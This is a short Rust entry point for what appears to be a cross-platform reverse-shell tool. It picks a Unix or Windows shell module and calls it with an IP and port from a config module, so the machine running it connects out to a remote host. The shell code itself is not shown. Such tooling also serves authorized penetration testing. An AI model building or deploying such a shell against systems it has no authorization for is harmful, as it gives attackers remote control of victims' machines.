// Load configuration values
mod config;

// Load the appropriate operating system's implementation
#[cfg(unix)]
mod rco_rev_shell_unix;
#[cfg(unix)]
use rco_rev_shell_unix::shell;

#[cfg(windows)]
extern crate windows;
#[cfg(windows)]
mod rco_rev_shell_windows;
#[cfg(windows)]
use rco_rev_shell_windows::shell;

fn main() {
    shell(config::IP, config::PORT);
}